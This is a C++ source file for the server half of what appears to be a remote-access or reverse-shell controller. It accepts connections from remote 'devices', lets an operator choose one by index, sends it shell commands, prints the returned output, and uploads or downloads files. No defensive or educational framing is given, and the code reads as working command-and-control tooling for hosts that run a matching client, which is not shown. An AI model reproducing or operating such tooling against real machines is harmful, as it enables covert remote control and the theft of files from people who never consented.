#include "Server.hpp"
#include <thread>

Server::Server(uint16_t port, uint16_t q_size)
{
    this->port = port;
    this->q_size = q_size;
    this->server_sock = create_sock();
    memset(this->client_arr, 0, MAX_QUEUE * sizeof(SOCKET));
    memset(this->buff_send, 0, BUFF_SIZE);
    memset(this->buff_recv, 0, BUFF_SIZE);
    this->client_num = 0;
}

void Server::initialize_server()
{
    bind_to_port(this->server_sock, this->port);
    start_listening(this->server_sock, this->q_size);
}



void Server::run()
{
    this->initialize_server(); 
    std::thread t1(&Server::control, this);
    while(true)
    {
        sockaddr_in client;

        this->client_arr[client_num] = accept_connection(this->server_sock, &client);
        
        fprintf(stdout, "\nNEW DEVICE CONNECTED! Connected DEVICE COUNT:%d\n", this->client_num + 1);
        fflush(stdout);
        this->client_num += 1;
    }
    t1.join();
}

void Server::control()
{   
    while(this->client_num == 0) {};
    fprintf(stdout, "Provide the Command!\n");
    int c;
    while(true)
    {   
        fprintf(stdout, "[INFO]Enter command:");
        fgets(this->buff_send, BUFF_SIZE, stdin);
        if(strcmp(this->buff_send + 1, "\n") == 0) continue;
        if(buff_send[0] - 48 >= this->client_num || buff_send[0] > 57) continue;
        size_t input_size = strlen(buff_send);
        buff_send[input_size - 1] = '\0';
        this->handle_client(client_arr[buff_send[0] - 48]);
    }
}

void Server::download_file(const char* filename, SOCKET client_socket)
{
    FILE* file = fopen(filename, "wb");
    uint32_t file_size;
    recv(client_socket, (char*)&file_size, sizeof(file_size), 0);
    int c, b_size = BUFF_SIZE;
    while(file_size > 0)
    {
        if(file_size <= BUFF_SIZE) b_size = file_size;
        c = recv(client_socket, this->buff_recv, b_size, 0);
        fwrite(this->buff_recv, sizeof(char), c, file);
        file_size -= c;
    }
    fclose(file);
}

void Server::upload_file(const char* filename, SOCKET client_socket)
{
    FILE* file = fopen(filename, "rb");
    uint32_t file_size = get_file_size(file);
    send(client_socket, (char*)&file_size, sizeof(file_size), 0);
    uint32_t c, sum = 0;
    while(sum < file_size)
    {
        c = fread(this->buff_send, sizeof(char), BUFF_SIZE, file);
        send(client_socket, this->buff_send, c, 0);
        sum += c;
    }
    fclose(file);
}

void Server::handle_client(SOCKET sock)
{
    int c = send(sock, buff_send + 1, strlen(this->buff_send + 1), 0);
    char** tokens = split_str(this->buff_send + 1, ' ');
    
    if(strcmp(tokens[0], "upload") == 0)
    {
        this->upload_file(tokens[1], sock);
    }
    else if(strcmp(tokens[0], "download") == 0)
    {
        this->download_file(tokens[1], sock);
    }
    else if(strcmp(tokens[0], "cd") == 0)
    {
        c = recv(sock, buff_recv, BUFF_SIZE, 0);
        fwrite(buff_recv, 1, c, stdout);
    }
    else
    {
        this->get_output(sock);
    }
    free_tokens(tokens);
}

void Server::get_output(SOCKET sock)
{
    int c;
    while(true)
    {
        c = recv(sock, this->buff_recv, BUFF_SIZE, 0);
        if(c < BUFF_SIZE)
        {
            fwrite(this->buff_recv, 1, c, stdout);
            break;
        }
        fwrite(this->buff_recv, 1, c, stdout);
    }
    fprintf(stdout, "\n");
}